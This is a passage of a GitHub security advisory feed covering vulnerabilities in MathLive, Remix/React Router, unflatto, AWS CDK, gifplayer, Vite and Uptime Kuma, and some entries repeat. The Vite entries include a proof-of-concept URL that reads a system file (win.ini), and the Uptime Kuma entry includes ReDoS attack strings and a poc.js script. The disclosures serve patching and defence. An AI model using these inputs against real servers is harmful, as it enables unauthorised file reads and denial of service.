<p>This advisory has been withdrawn because it is a duplicate of GHSA-qwj6-q94f-8425. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>Cross Site Scripting vulnerability in arnog MathLive Versions v0.103.0 and before (fixed in 0.104.0) allows an attacker to execute arbitrary code via the MathLive function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29049">https://nvd.nist.gov/vuln/detail/CVE-2025-29049</a></li>
<li><a href="https://github.com/arnog/mathlive/commit/abc26056fd5e29a99edfa96a0bbe855ea2a8b678">https://github.com/arnog/mathlive/commit/abc26056fd5e29a99edfa96a0bbe855ea2a8b678</a></li>
<li><a href="https://github.com/advisories/GHSA-qwj6-q94f-8425">https://github.com/advisories/GHSA-qwj6-q94f-8425</a></li>
<li><a href="https://github.com/advisories/GHSA-929m-phjg-qwcc">https://github.com/advisories/GHSA-929m-phjg-qwcc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-929m-phjg-qwcc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-01T21:31:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@remix-run/express] Remix and React Router allow URL manipulation via Host / X-Forwarded-Host headers]]></title>
        <id>https://github.com/advisories/GHSA-4q56-crqp-v477</id>
        <link href="https://github.com/advisories/GHSA-4q56-crqp-v477"/>
        <updated>2025-04-01T22:23:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>We received a report about a vulnerability in Remix/React Router that affects all Remix 2 and React Router 7 consumers using the Express adapter. Basically, this vulnerability allows anyone to spoof the URL used in an incoming <code>Request</code> by putting a URL pathname in the port section of a URL that is part of a <code>Host</code> or <code>X-Forwarded-Host</code> header sent to a Remix/React Router request handler.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been patched and released in Remix 2.16.3 React Router 7.4.1.</p>
<h3 id="credits">Credits</h3>
<ul>
<li>Rachid Allam (zhero;)</li>
<li>Yasser Allam (inzo_)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/remix-run/react-router/security/advisories/GHSA-4q56-crqp-v477">https://github.com/remix-run/react-router/security/advisories/GHSA-4q56-crqp-v477</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31137">https://nvd.nist.gov/vuln/detail/CVE-2025-31137</a></li>
<li><a href="https://github.com/advisories/GHSA-4q56-crqp-v477">https://github.com/advisories/GHSA-4q56-crqp-v477</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4q56-crqp-v477</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-01T22:23:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@react-router/express] Remix and React Router allow URL manipulation via Host / X-Forwarded-Host headers]]></title>
        <id>https://github.com/advisories/GHSA-4q56-crqp-v477</id>
        <link href="https://github.com/advisories/GHSA-4q56-crqp-v477"/>
        <updated>2025-04-01T22:23:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>We received a report about a vulnerability in Remix/React Router that affects all Remix 2 and React Router 7 consumers using the Express adapter. Basically, this vulnerability allows anyone to spoof the URL used in an incoming <code>Request</code> by putting a URL pathname in the port section of a URL that is part of a <code>Host</code> or <code>X-Forwarded-Host</code> header sent to a Remix/React Router request handler.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been patched and released in Remix 2.16.3 React Router 7.4.1.</p>
<h3 id="credits">Credits</h3>
<ul>
<li>Rachid Allam (zhero;)</li>
<li>Yasser Allam (inzo_)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/remix-run/react-router/security/advisories/GHSA-4q56-crqp-v477">https://github.com/remix-run/react-router/security/advisories/GHSA-4q56-crqp-v477</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31137">https://nvd.nist.gov/vuln/detail/CVE-2025-31137</a></li>
<li><a href="https://github.com/advisories/GHSA-4q56-crqp-v477">https://github.com/advisories/GHSA-4q56-crqp-v477</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4q56-crqp-v477</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-01T22:23:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@alizeait/unflatto] @alizeait/unflatto Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-q8jq-4rm5-4hm5</id>
        <link href="https://github.com/advisories/GHSA-q8jq-4rm5-4hm5"/>
        <updated>2025-04-01T14:54:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>alizeait unflatto &lt;= 1.0.2 was discovered to contain a prototype pollution via the method exports.unflatto at /dist/index.js. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been patched in 1.0.3</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/advisories/GHSA-799q-f2px-wx8c">https://github.com/advisories/GHSA-799q-f2px-wx8c</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/alizeait/unflatto/security/advisories/GHSA-q8jq-4rm5-4hm5">https://github.com/alizeait/unflatto/security/advisories/GHSA-q8jq-4rm5-4hm5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38988">https://nvd.nist.gov/vuln/detail/CVE-2024-38988</a></li>
<li><a href="https://github.com/alizeait/unflatto/issues/32">https://github.com/alizeait/unflatto/issues/32</a></li>
<li><a href="https://github.com/alizeait/unflatto/commit/3c1b120f1dcd44eefe07d4a5022e1baa3c7164d3">https://github.com/alizeait/unflatto/commit/3c1b120f1dcd44eefe07d4a5022e1baa3c7164d3</a></li>
<li><a href="https://gist.github.com/mestrtee/4c5dfb66bea377889c44dd6c8af28713">https://gist.github.com/mestrtee/4c5dfb66bea377889c44dd6c8af28713</a></li>
<li><a href="https://github.com/advisories/GHSA-q8jq-4rm5-4hm5">https://github.com/advisories/GHSA-q8jq-4rm5-4hm5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8jq-4rm5-4hm5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-01T14:54:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aws-cdk-lib] aws-cdk-lib has Insertion of Sensitive Information into Log File vulnerability when using Cognito UserPoolClient Construct]]></title>
        <id>https://github.com/advisories/GHSA-qq4x-c6h6-rfxh</id>
        <link href="https://github.com/advisories/GHSA-qq4x-c6h6-rfxh"/>
        <updated>2025-03-31T22:37:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://aws.amazon.com/cdk/">AWS Cloud Development Kit (CDK)</a> is an open-source framework for defining cloud infrastructure using code. Customers use it to create their own applications which are converted to AWS CloudFormation templates during deployment to a customer’s AWS account. CDK contains pre-built components called "<a href="https://docs.aws.amazon.com/cdk/v2/guide/constructs.html">constructs</a>" that are higher-level abstractions providing defaults and best practices. This approach enables developers to use familiar programming languages to define complex cloud infrastructure more efficiently than writing raw CloudFormation templates.</p>
<p>The CDK <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPool.html">Cognito UserPool</a> construct deploys an AWS cognito user pool. An <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools.html">Amazon Cognito user pool</a> is a user directory for web and mobile app authentication and authorization. Customers can deploy a client under this user pool through construct ‘<a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPoolClient.html">UserPoolClient</a>’ or through helper method '<a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPool.html#addwbrclientid-options">addClient</a>'. A user pool client resource represents an Amazon <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html">Cognito user pool client</a> which is a configuration within a user pool that interacts with one mobile or web application authenticating with Amazon Cognito. </p>
<p>When users of the 'cognito.UserPoolClient' construct generate a secret value for the application client in AWS CDK, they can then reference the generated secrets in their stack. The CDK had an issue where, when the custom resource performed an SDK API call to 'DescribeCognitoUserPoolClient' to retrieve the generated secret, the full response was logged in the associated lambda function's log group. Any user authenticated in the account where logs of the custom resource are accessible and who has read-only permission could view the secret written to those logs. </p>
<p>This issue does not affect customers who are generating the secret value outside of the CDK as the secret is not referenced or logged.</p>
<h3 id="impact">Impact</h3>
<p>To leverage this issue, an actor has to be authenticated in the account where logs of the custom resource Custom::DescribeCognitoUserPoolClient are accessible and have read-only permission for lambda function logs. </p>
<p>Users can review access to their log group through AWS CloudTrail logs to detect any unexpected access to read the logs.</p>
<p><strong>Impacted versions: &gt;2.37.0 and &lt;=2.187.0</strong></p>
<h3 id="patches">Patches</h3>
<p>The patches are included in the AWS CDK Library release v2.187.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. To fully address this issue, users should rotate the secret by generating a new secret stored in AWS Secrets Manager. References to the secret will use the new secret on update. </p>
<p>When new CDK applications using the latest version are initialized, they will use the new behavior with updated logging. </p>
<p>Existing applications must upgrade to the latest version, change the <a href="https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/cx-api/FEATURE_FLAGS.md">feature flag</a> (@aws-cdk/cognito:logUserPoolClientSecretValue) to false, redeploy the application to apply this fix and use the new implementation with updated logging behavior.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can override the implementation changing Logging to be Logging.withDataHidden(). For example define class CustomUserPoolClient extends UserPoolClient and&nbsp; in the new class define get userPoolClientSecret() to use Logging.withDataHidden().</p>
<p>Example</p>
<pre><code>export class CustomUserPoolClient extends UserPoolClient {

  private readonly customUserPool : UserPool;
  private readonly customuserPoolClientId : string;
  constructor(scope: Construct, id: string, props: UserPoolClientProps) {
    super(scope, id, props);

    this.customUserPool = new UserPool(this, 'pool', {
      removalPolicy: RemovalPolicy.DESTROY,
    });

    const client = this.customUserPool.addClient('client', { generateSecret: true });
  }



  // Override the userPoolClientSecret getter to always return the secret
  public get userPoolClientSecret(): SecretValue {
    // Create the Custom Resource that assists in resolving the User Pool Client secret
    const secretValue = SecretValue.resourceAttribute(new AwsCustomResource(
      this,
      'DescribeCognitoUserPoolClient',
      {
    resourceType: 'Custom::DescribeCognitoUserPoolClient',
    onUpdate: {
      region: cdk.Stack.of(this).region,
      service: 'CognitoIdentityServiceProvider',
      action: 'describeUserPoolClient',
      parameters: {
        UserPoolId: this.customUserPool.userPoolId,
        ClientId: this.customUserPool,
      },
      physicalResourceId: PhysicalResourceId.of(this.userPoolClientId),
      // Disable logging of sensitive data
      logging: Logging.withDataHidden(),
    },
    policy: AwsCustomResourcePolicy.fromSdkCalls({
      resources: [this.customUserPool.userPoolArn],
    }),
    installLatestAwsSdk: false,
      },
    ).getResponseField('UserPoolClient.ClientSecret'));
    
    return secretValue;
  }
}
</code></pre>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory please contact AWS/Amazon Security via our <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/aws-cdk/security/advisories/GHSA-qq4x-c6h6-rfxh">https://github.com/aws/aws-cdk/security/advisories/GHSA-qq4x-c6h6-rfxh</a></li>
<li><a href="https://github.com/aws/aws-cdk/commit/d02e64aac18a72195ddcdb973defea7f32382c33">https://github.com/aws/aws-cdk/commit/d02e64aac18a72195ddcdb973defea7f32382c33</a></li>
<li><a href="https://github.com/advisories/GHSA-qq4x-c6h6-rfxh">https://github.com/advisories/GHSA-qq4x-c6h6-rfxh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qq4x-c6h6-rfxh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T22:37:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gifplayer] gifplayer XSS vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-gr7w-hmch-25g7</id>
        <link href="https://github.com/advisories/GHSA-gr7w-hmch-25g7"/>
        <updated>2025-03-31T22:36:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>XSS vulnerability. All versions under 0.3.7 are impacted</p>
<h3 id="patches">Patches</h3>
<p>Please upgrade to 0.3.7</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rubentd/gifplayer/security/advisories/GHSA-gr7w-hmch-25g7">https://github.com/rubentd/gifplayer/security/advisories/GHSA-gr7w-hmch-25g7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31128">https://nvd.nist.gov/vuln/detail/CVE-2025-31128</a></li>
<li><a href="https://github.com/rubentd/gifplayer/commit/2966193d4d066e5a6ba09dbdf1e1c7f8238630c8">https://github.com/rubentd/gifplayer/commit/2966193d4d066e5a6ba09dbdf1e1c7f8238630c8</a></li>
<li><a href="https://github.com/advisories/GHSA-gr7w-hmch-25g7">https://github.com/advisories/GHSA-gr7w-hmch-25g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gr7w-hmch-25g7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T22:36:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] Uptime Kuma's Regular Expression in pushdeeer and whapi file Leads to ReDoS Vulnerability Due to Catastrophic Backtracking]]></title>
        <id>https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</id>
        <link href="https://github.com/advisories/GHSA-hx7h-9vf7-5xhg"/>
        <updated>2025-03-31T16:12:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a <code>ReDoS vulnerability risk</code> in the system, specifically when administrators create <code>notification</code> through the web service(<code>pushdeer</code> and <code>whapi</code>). If a string is provided that triggers catastrophic backtracking in the regular expression, it may lead to a ReDoS attack.</p>
<h3 id="details">Details</h3>
<p>The regular expression<code> \/*$\</code> is used to match zero or more slashes <code>/</code> at the end of a URL. When a malicious attack string appends a large number of slashes <code>/</code> and a non-slash character at the end of the URL, the regular expression enters a backtracking matching process. During this process, the regular expression engine starts checking each slash from the first one, continuing until it encounters the last non-slash character. Due to the greedy matching nature of the regular expression, this process repeats itself, with each backtrack checking the next slash until the last slash is checked. This backtracking process consumes significant CPU resources.</p>
<pre><code class="language-js">.replace(/\/*$/, "")
</code></pre>
<p>For the regular expression <code>/\/*$/</code>, an attack string like </p>
<pre><code class="language-javascript">"https://e" + "/".repeat(100000) + "@" 
</code></pre>
<p>can trigger catastrophic backtracking, causing the web service to freeze and potentially leading to a ReDoS attack.</p>
<blockquote>
<p>When entered from the web interface, the attack string needs to expand <code>"/".repeat(100000)</code> and be input directly, such as <code>https://e/////////..//@</code>. This triggers catastrophic backtracking, leading to web service lag and posing a potential ReDoS attack risk.</p>
</blockquote>
<h3 id="poc">PoC</h3>
<p>The poc.js is in: 
<a href="https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a>
The time lag phenomenon can be observed through test-pushdeer-ReDos, which helps verify the presence of the ReDoS attack:</p>
<pre><code class="language-javascript">const semver = require("semver");
let test;
const nodeVersion = process.versions.node;
if (semver.satisfies(nodeVersion, "&gt;= 18")) {
    test = require("node:test");
} else {
    test = require("test");
}
const PushDeer = require("../../server/notification-providers/pushdeer.js");

const assert = require("node:assert");

test("Test ReDos - attack string", async (t) =&gt; {
    const pushDeer = new PushDeer();
    const notification = {
        pushdeerServer: "https://e" + "/".repeat(100000) + "@",
    };
    const msg = "Test Attacking";
    const startTime = performance.now();
    try {
        pushDeer.send(notification, msg)
    } catch (error) {
    // pass
    }
    const endTime = performance.now();
    const elapsedTime = endTime - startTime;
    const reDosThreshold = 2000;
    assert(elapsedTime &lt;= reDosThreshold, `🚨 Potential ReDoS Attack! send method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);
});
</code></pre>
<blockquote>
<p>Move the <code>test-uptime-calculator.js</code> file to the <code>./uptime-kuma/test/backend-test</code> folder and run <code>npm run test-backend</code> to execute the backend tests.</p>
</blockquote>
<p>Trigger conditions for whapi jams, In the send function within the <code>uptime-kuma\server\notification-providers\pushdeer.js</code> file:
<a href="https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></p>
<pre><code class="language-js">// The attack string "httpS://example" + "/".repeat(100000) + "@"
// poc.js
// Import the target file
const Whapi = require("./uptime-kuma/server/notification-providers/whapi");

// Create an instance of Whapi
const whapi = new Whapi();

const notification = {
    whapiApiUrl: "https://e" + "/".repeat(100000) + "@",
};
// console.log(`${notification.whapiApiUrl}`);
// Define the message to be sent
const msg = "Test Attacking";

// Call the send method and handle exceptions
whapi.send(notification, msg)

// 1-5 are the original installation methods for the project
// 6-8 are attack methods
// ---
// 1.run `git clone https://github.com/louislam/uptime-kuma.git`
// 2.run `cd uptime-kuma`
// 3.run `npm run setup`
// 4.run `npm install pm2 -g &amp;&amp; pm2 install pm2-logrotate`
// 5.run `pm2 start server/server.js --name uptime-kuma`
// ---
// 6.Run npm install in the root directory of the same level as `README.md`
// 7.Move `poc.js` to the root directory of the same level as `README.md`
// 8.and then run `node poc.js`
</code></pre>
